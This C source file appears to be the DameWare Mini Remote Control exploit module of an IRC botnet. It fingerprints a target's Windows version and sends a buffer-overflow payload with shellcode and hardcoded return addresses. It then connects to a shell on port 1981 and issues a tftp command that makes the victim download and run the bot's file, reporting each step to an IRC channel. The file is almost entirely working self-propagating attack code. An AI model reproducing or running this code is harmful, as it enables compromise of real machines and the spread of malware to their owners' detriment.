/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////


#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DAMEWARE

unsigned char send_buff[40] = {
	0x30, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC3, 0xF5, 0x28, 0x5C, 0x8F, 0xC2, 0x0D, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 
};

// I'm not gonna touch that struct, I'd rather die a slow and painful death - Ago :)
TARGET_OS target_os[]={
	{"UNKNOWN",{{0,""},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}}, 
	{"WIN 2000",{{0x750362c3,"ws2_32.dll" },{0x75035173,"ws2_32.dll"},{0x717564B8,"comctl32.dll"},{0x717564B8,"comctl32.dll"},{0x717564B8,"comctl32.dll"},{0,""},{0,""}}}, //sp3 OK 0x77dc6d03, sp4 OK 0x7c2ec68b
	{"WIN XP",{{0x71ab7bfb,"ws2_32.dll"},{0x773AD507,"advapi32.dll"},{0,""},{0,""},{0,""},{0,""},{0,""}}}, //2 sp on winxp ,0x77e2d9d3, 0x773E19C3 chez moi (xp sp1 us)
	{"WIN 2003",{{0x77db565c,"advapi32.dll"},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}}, //SP 0?? 
	{"WIN NT4",{{0x77777777,"unknown.dll"},{0x77777776,"unknown.dll"},{0x77777775,"unknown.dll"},{0x77f326c6,"kernel32.dll"},{0x77777773,"unknown.dll"},{0x77777772,"unknown.dll"},{0x77f9d463,"kernel32.dll"}}} // only SP3 + SP 6 r filled in
}; 

extern char shellcode[];

BOOL DameWare(EXINFO exinfo)
{
	char buffer[IRCLINE], szRecvBuf[5096], szReqBuf[5096]; 
	
	int os_sp=0, os_ver=check_os((char*)exinfo.ip,exinfo.port,&os_sp);
	BOOL bRet = FALSE;

	WSADATA WSAData;
 	if (fWSAStartup(MAKEWORD(1,1), &WSAData)!=0) 
		return FALSE; 

	// Build a buffer with the shellcode
	memcpy(szReqBuf,"\x10\x27",2);  
	memset(szReqBuf+0xc4+9,0x90,500); 

	*(unsigned long*)&szReqBuf[516] = target_os[os_ver].sp[os_sp].eip;
	
	memcpy(szReqBuf+520,				shellcode,				strlen(shellcode)	);
	memcpy(szReqBuf+1042,				"neTmaNiac",			9					);
	memcpy(szReqBuf+0x5b4+0x24,			"netmaniac was here",	18					);
	memcpy(szReqBuf+0x5b4+0x128,		"12/12/04 13:13:13",	17					);
	memcpy(szReqBuf+0x5b4+0x538,		"netninjaz_place",		15					);
	memcpy(szReqBuf+0x5b4+0x5b4+0x88,	"131.131.131.131",		16					);
	memcpy(szReqBuf+0x5b4+0x5b4+0x394,	"3.72.0.0",				strlen("3.72.0.0")	);

	// Connect to the server
	SOCKET sSock;
	if((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
		ssin.sin_port = fhtons(exinfo.port);

		if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			_snprintf(buffer, sizeof(buffer), "[%s]: Connected to %s\r\n", exploit[exinfo.exploit].name, GetIP(sSock));
			irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

			TIMEVAL timeout;
			timeout.tv_sec = 5;
			timeout.tv_usec = 0;
			fd_set fd;
			FD_ZERO(&fd);
			FD_SET(sSock, &fd);

			if (fselect(0, &fd, NULL, NULL, &timeout) > 0) {
				memset(szRecvBuf, 0, sizeof(szRecvBuf));
				if (frecv(sSock,(char *)szRecvBuf,sizeof(szRecvBuf),0) > 0) {
					memset(szRecvBuf,0,sizeof(szRecvBuf)); 
					
					Sleep(500);
					if (fsend(sSock,(char *)send_buff,strlen((char *)send_buff),0) > 0) {
						irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

						Sleep(2000);
						if (frecv(sSock,(char *)szRecvBuf, sizeof(szRecvBuf),0) > 0) {
							irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

							Sleep(500);
							if(fsend(sSock,(char *)szReqBuf,strlen((char *)szReqBuf),0) > 0) {
								Sleep(10000); 
								fclosesocket(sSock);

								memset(&ssin, 0, sizeof(ssin));
								ssin.sin_family = AF_INET;
								ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
								ssin.sin_port = fhtons(1981);

								if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {	
									char cmd_buff[400];

									_snprintf(cmd_buff,sizeof(cmd_buff),
										"tftp -i %s get %s\n"
										"%s\n",
										GetIP(exinfo.sock),filename, filename);
									if(frecv(exinfo.sock, szRecvBuf, sizeof(szRecvBuf), 0) > 0) {
										Sleep(500);

										if(fsend(sSock,(char*)cmd_buff, strlen(cmd_buff),0) > 0) {
											fclosesocket(sSock);

											_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
											if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
											addlog(buffer);
											bRet = TRUE;
										}
									}
								}
							}
						}
					}
				}
			}
		}
		fclosesocket(sSock);
	}

	return (bRet);
}

int check_os(char *host,unsigned short target_port, int *sp) 
{	
	SOCKET sSock;
	if ((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_addr.s_addr = finet_addr(host);
		ssin.sin_port = fhtons(target_port);

		if (fconnect(sSock,(LPSOCKADDR)&ssin,sizeof(ssin)) != SOCKET_ERROR) {
			char recv_buff[5000];
			memset(recv_buff,0,sizeof(recv_buff));

			TIMEVAL timeout;
			timeout.tv_sec = 5;
			timeout.tv_usec = 0;
			fd_set fd;
			FD_ZERO(&fd);
			FD_SET(sSock, &fd);

			if (fselect(0, &fd, NULL, NULL, &timeout) > 0) {
				if (frecv(sSock,recv_buff,sizeof(recv_buff),0) > 0) { 
					if (fsend(sSock,(const char *)send_buff,strlen((const char*)send_buff),0) > 0) {
						if (frecv(sSock,recv_buff,sizeof(recv_buff),0) > 0) {
							fclosesocket(sSock); 
	
							*sp=atoi(&recv_buff[37]); 
	
							if (recv_buff[8] == 5 && recv_buff[12] == 0)
								return ID_WIN2K;
							else if	(recv_buff[8] == 5 && recv_buff[12] == 1)
								return ID_WINXP;
							else if	(recv_buff[8] == 5 && recv_buff[12] == 2)	
								return ID_WIN2K3;
							else if	(recv_buff[8] == 4)
								return ID_WINNT;
							else
								return ID_UNKNOWN;
						}
					}
				}
			}
		}
		fclosesocket(sSock);
	}
	
	return 1;
}

#endif

